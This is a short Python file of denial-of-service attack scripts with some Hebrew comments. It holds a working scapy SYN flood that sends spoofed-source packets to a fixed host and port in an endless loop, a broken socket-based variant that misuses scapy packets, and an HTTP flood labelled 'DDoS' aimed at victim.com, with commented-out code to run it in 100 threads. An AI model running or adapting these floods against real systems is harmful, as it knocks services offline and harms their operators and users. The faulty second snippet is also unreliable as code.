from scapy.all import *

# Function to send SYN packets
def send_syn(target_ip, target_port):
    # Send SYN packets in a loop
    while True:
        # Craft the SYN packet
        ip_pkt = IP(src="10.0.0.1", dst=target_ip)
        syn_pkt = TCP(sport=RandShort(), dport=target_port, flags="S")
        # Send the packet
        send(ip_pkt/syn_pkt, verbose=False)

# Target IP and port
target_ip = '192.168.1.100'
target_port = 80  # HTTP port

# Call the function to send SYN packets
send_syn(target_ip, target_port)

#================================================================================
import socket
from scapy.layers.inet import IP, TCP

# פונקציה לשליחת חבילות בעזרת Socket
def send_packet(target_ip, target_port):
    # יצירת חיבור Socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # ניסיון להתחבר למטרה
        s.connect((target_ip, target_port))
        print(f"[*] Connection established to {target_ip}:{target_port}")
        # כאן תוכל לשלוח נתונים תוקפים
        ip = IP(src="10.0.0.1", dst="192.168.1.1")
        syn = TCP(sport=1234, dport=80, flags="S", seq=12345)
        s.send(ip/syn, count=100)
    except Exception as e:
        print(f"[*] Error occurred: {e}")
    finally:
        # סגירת חיבור
        s.close()

# פרטי המטרה לתקיפה
target_ip = '192.168.1.100'
target_port = 80  # פורט HTTP

# שליחת חבילות למטרה + קריאה לפונקציה
#send_packet(target_ip, target_port)

#================================= DDoS ===============================================
import requests
import threading

def attack():
    while True:
        try:
            requests.get("https://victim.com", timeout=2)
        except:
            pass

# להריץ 100 חוטים (threads) בו זמנית
#for i in range(100):
#    t = threading.Thread(target=attack)
#    t.start()

